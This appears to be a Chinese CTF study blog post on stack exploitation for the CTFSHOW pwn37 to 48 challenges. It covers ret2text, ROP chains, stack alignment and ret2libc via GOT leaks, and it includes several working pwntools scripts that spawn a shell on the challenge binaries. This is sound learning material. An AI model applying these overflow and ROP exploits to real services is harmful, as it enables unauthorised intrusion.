<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

    
<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
    

<meta charset="utf-8" >

<title>PWN_CTF_Stack</title>
<meta name="keywords" content="PWN_CTF_Stack, Kidder1&#39;s Blog!">
<meta name="description" content="Pwn_CTF刷题和知识点记录:栈部分">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:title" content="PWN_CTF_Stack">
<meta property="og:description" content="Pwn_CTF刷题和知识点记录:栈部分">

<link rel="shortcut icon" href="/favicon.ico">
<link rel="stylesheet" href="/style/main.css">

  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Kidder1's Blog!" type="application/atom+xml">
</head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://kidder1.github.io">
        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://kidder1.github.io">
        <h1 class="site-title">Kidder1&#39;s Blog!</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/" class="menu purple-link">
        首页
      </a>
    
  
    
      <a href="/categories" class="menu purple-link">
        分类
      </a>
    
  
    
      <a href="/tags/" class="menu purple-link">
        标签
      </a>
    
  
    
      <a href="/archives" class="menu purple-link">
        归档
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        关于
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">PWN_CTF_Stack</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-07-24</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/Pwn/">
              Pwn
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="pwn37-38-return-text"><a href="#pwn37-38-return-text" class="headerlink" title="pwn37&#x2F;38(return text)"></a>pwn37&#x2F;38(return text)</h2><blockquote>
<p>ret2text (Return-to-text&#x2F;Return-to-code): ret2text 是一种利用栈溢出等漏洞，将程序控制流导向程序本身的代码区域（text&#x2F;code segment）的技术。在许多程序中，代码区域是可执行的，因此攻击者可以通过改变程序执行流程，使其执行恶意的代码。一般情况下，攻击者会在栈上放置一个指向代码区域中恶意代码的地址，然后通过溢出等漏洞改变函数的返回地址，使程序跳转到恶意代码并执行.。 </p>
</blockquote>
<h3 id="查看内存常用命令"><a href="#查看内存常用命令" class="headerlink" title="查看内存常用命令"></a>查看内存常用命令</h3><blockquote>
<p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p>
</blockquote>
<p>GDB测偏移</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725170934385.png"  class="" lazyload></a>

<p>关于栈平衡的问题：如果正常的payload打不通，就在payload前面加一个ret的地址进行栈平衡，让继续执行下一个指令。</p>
<p>gdb调试system成功，rbp下面就是返回地址，可以通过gdb查看是否改写成功。</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230725184203864.png"  class="" lazyload></a>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400657</span></span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) +p64(ret)+p64(backdoor)<span class="comment"># 放一个ret平衡栈，在rop链子的前面</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn39（没有后门函数）"><a href="#pwn39（没有后门函数）" class="headerlink" title="pwn39（没有后门函数）"></a>pwn39（没有后门函数）</h2><ul>
<li><p>注意点：在32位置中plt后面默认跟的是返回地址，所以函数的plt和参数中间要给返回补充padding</p>
</li>
<li><p>更好的理解：调用一个函数的时候要对应一个返回地址；也就是说，如果在system之后夺得shell的话，那就不需要在添加返回地址了</p>
<blockquote>
<p>32：sys_plt + ret_addr + bin&#x2F;sh 						必须添加</p>
<p>64：pop_rdi + bin&#x2F;sh + system +ret_addr 		可加可不加</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28134</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048750</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_plt)</span><br><span class="line"><span class="comment"># 这里0也可以用ret来代替，补充plt的返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;Just easy ret2text&amp;&amp;32bit&#x27;)</span></span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn40（没有后门函数，x64的寄存器传参顺序）"><a href="#pwn40（没有后门函数，x64的寄存器传参顺序）" class="headerlink" title="pwn40（没有后门函数，x64的寄存器传参顺序）"></a>pwn40（没有后门函数，x64的寄存器传参顺序）</h2><p>知识点传参顺序：</p>
<ol>
<li><strong>存器传参（Register Parameter Passing）</strong>：x64架构的计算机使用寄存器来传递一部分参数。通常情况下，前几个参数会被传递到特定的寄存器中，而不是存放在栈上。例如，对于Windows操作系统上的x64架构，前四个整数或指针参数（整数、指针、地址等）会被依次存放在寄存器<code>RCX</code>、<code>RDX</code>、<code>R8</code>和<code>R9</code>中。（还有一种说法：RDI, RSI, RDX, RCX, R8, R9）</li>
<li><strong>栈传参（Stack Parameter Passing）</strong>：如果函数参数的数量超过了寄存器的限制，额外的参数将存储在栈上。参数从右向左依次入栈，即后面的参数先入栈，前面的参数后入栈。在栈上传参时，可能会有对齐要求，保证栈上数据的对齐方式。</li>
<li><strong>返回值传递（Return Value Passing）</strong>：函数的返回值通常通过寄存器<code>RAX</code>来传递。整数和指针类型的返回值通常存储在<code>RAX</code>中，而浮点数返回值通常存储在<code>XMM0</code>寄存器中。</li>
</ol>
<p><strong>工具</strong>：ROPgadget –binary .&#x2F;file_name  –only “pop|ret” | grep reg</p>
<ul>
<li><p>关于如何区分32位和64位的参数payload的编写顺序：想两者函数调用的编写规则，然后给倒过来写即可：</p>
<blockquote>
<p>32：压入参数   压入返回地址   压入函数地址</p>
<p>64：寄存器传参数   压入返回地址   压入函数地址</p>
</blockquote>
</li>
</ul>
<p>栈平衡：在编程中，函数调用的栈平衡指的是在程序执行过程中，确保函数调用和返回的堆栈（通常称为调用栈或执行栈）的平衡</p>
<blockquote>
<p>栈平衡就是给加一个ret的地址作为跳板让其返回到下一个栈地址继续执行，作为一个填充长度，放在rop调用链之前或者调用函数之前，不能放到调用函数之后</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system) </span><br><span class="line"><span class="comment"># 错误写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi + p64(ret)) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(ret)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line">binsh = <span class="number">0x400808</span></span><br><span class="line">system = <span class="number">0x400520</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span></span><br><span class="line">system = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>)   + p64(ret)+ p64(pop_rdi) + p64(binsh)+p64(system) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn41-42-bin-sh使用sh代替"><a href="#pwn41-42-bin-sh使用sh代替" class="headerlink" title="pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)"></a>pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</h2><ol>
<li>system(“&#x2F;bin&#x2F;sh”) ：<br>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。这种方式可以确保使用系统默认的shell程序执行命令，因为&#x2F;bin&#x2F;sh 链接通常指向<br>默认shell的可执行文件。</li>
<li>system(“sh”) ：<br>使用system(“sh”) 会直接启动一个名为sh 的shell程序，并在新的子进程中执行。这种方式假设系统的环境变量$PATH 已经配置了能够找到sh 可执行文件的路径，否则可能会导致找不到sh 而执行失败。</li>
</ol>
<h2 id="pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）"><a href="#pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）" class="headerlink" title="pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）"></a>pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</h2><p>知识点</p>
<ul>
<li>注意bss段的buf可以手动构造bin&#x2F;sh字符串作为参数传入。</li>
</ul>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230728173933897.png"  class="" lazyload></a>

<ul>
<li>gets函数没有输入的长度限制，可以一直输入直至回车键</li>
<li>如果read这种有输入长度限制但是不够rop链的，可以进行栈迁移</li>
</ul>
<p>注意，这里的一个问题困扰了很久：一个简单的ROP链是可以用GDB进行调试的，那复杂的怎么办呢？</p>
<p>这里和同学进行了请教，然后对wp的看似简单的rop链进行分析，这里需要注意个几个点：</p>
<ol>
<li>每一个函数调用在32位里面都需要跟一个返回地址，这里gets的返回地址是pop_ebx，system的返回地址是aaaa，main函数的返回地址是gets，因为如果你后面rop链要继续调用的话，函数调用为了完整性返回地址、参数必须完整</li>
<li>这段rop链子的调用过程概述：通过返回地址到gets读取参数buf2的参数（通过sendline传送的&#x2F;bin&#x2F;sh）然后通过pop将buf2存入ebx，然后system调用参数buf2中的bin&#x2F;sh从而夺权</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28169)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x804B060</span></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx = <span class="number">0x8048409</span> <span class="comment"># 0x08048409 : pop ebx ; ret</span></span><br><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x602080</span></span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"><span class="comment"># ret栈对齐是0x10 加单数个理论上</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)  + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


</li>
<li><p>gdb的调试过程：通过查看内存变量观察函数的调用过程    通过观察主函数的返回地址观察函数调用过程</p>
<ol>
<li><p>先通过finish运行到主函数内部进行查看</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731224725259.png"  class="" lazyload></a>
</li>
<li><p>然后发现主函数返回到gets函数</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731224947918.png"  class="" lazyload></a>
</li>
<li><p>查看gets的系统调用执行</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225224295.png"  class="" lazyload></a>
</li>
<li><p>通过finish查看gets的返回地址是pop ebx 然后ret到system执行，在这里只是pop  ebx只是作为一个跳板，只是为了返回到system地址进行getshell而已</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225354257.png"  class="" lazyload></a>
</li>
<li><p>发现一致</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731225807535.png"  class="" lazyload></a>
</li>
<li><p>这里还有一个简单的思路：通过覆盖gets的返回地址为system，然后让system的返回地址为buf2同时作为gets的参数也可以getshell，这个原理就是每个函数调用的参数返回地址等，与其他函数的调用无关。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(system) + p32(buf2)+ p32(buf2)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="pwn45-46-got表泄露-ret2libc"><a href="#pwn45-46-got表泄露-ret2libc" class="headerlink" title="pwn45&#x2F;46(got表泄露) ret2libc"></a>pwn45&#x2F;46(got表泄露) ret2libc</h2><blockquote>
<p> 特征：没有system  没有bin&#x2F;sh</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。这里注意要对泄露的函数原型进行查看，对payload要完成传参。</p>
<p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p>
</blockquote>
<h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731145442576.png"  class="" lazyload></a></p>
<p>查询libc偏移和版本的网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x08048356</span></span><br><span class="line">lg(<span class="string">&#x27;puts plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;write plt&#x27;</span>, write_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过打印获得puts的地址</span></span><br><span class="line"><span class="comment"># read 0xC8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>)  </span><br><span class="line"><span class="comment"># 这里的返回地址写成main函数可以让这个payload执行完毕之后，再一次进行溢出</span></span><br><span class="line">payload += p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 因为小端序 倒取四个字节</span></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过puts的地址获取libc的地址</span></span><br><span class="line"><span class="comment"># puts_addr = 0xf7d6b360</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x067360</span></span><br><span class="line">system_plt = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh =  libc_base + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>) </span><br><span class="line">payload += p32(system_plt) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的接收的&#x2F;x7f，因为libc的地址是六位，前两位是00不显示。又因为接收的的字节，所以用u64解包，并且高位用00补全八位</p>
<blockquote>
<p>0x 7f ff f7 e1 50 00<br>puts_addr &#x3D; p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’）</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731173353357.png"  class="" lazyload></a>
<p>puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731173459832.png"  class="" lazyload></a>
</blockquote>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230731172534065.png"  class="" lazyload></a>

<h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230801164558925.png"  class="" lazyload></a>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里有一个注意的点，p64(pop_rsi_r15)这个点，对于write这个函数的参数只有三个参数：</p>
<ul>
<li>fd：文件描述符，这里就是1</li>
<li>buf：需要传入的字符串</li>
<li>count：每次写入的字节数</li>
</ul>
<p>但是看看gadget，只能控制rdi和rsi，r15不能控制，这种情况一般是没有用的padding给填充位置，或者没办法控制。</p>
<a class="simple-lightbox" href="/2023/07/24/PWN_CTF_Stack/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/PWN_CTF_Stack/image-20230801211525162.png"  class="" lazyload></a>

<h2 id="pwn47-48（ret2libc-LibcSeacher）"><a href="#pwn47-48（ret2libc-LibcSeacher）" class="headerlink" title="pwn47&#x2F;48（ret2libc - LibcSeacher）"></a>pwn47&#x2F;48（ret2libc - LibcSeacher）</h2><h3 id="四个libc目录区别"><a href="#四个libc目录区别" class="headerlink" title="四个libc目录区别"></a>四个libc目录区别</h3><blockquote>
<p>在Linux系统中，这四个目录(lib, lib32, lib64, libx32)是用来存放共享库文件的目录，它们之间有一些区别，具体如下：</p>
<ol>
<li>lib目录：这是存放32位架构的共享库的目录。在早期的32位系统中使用，现在仍然保留为了向后兼容性。通常位于<code>/usr/lib</code>或者<code>/lib</code>目录下。</li>
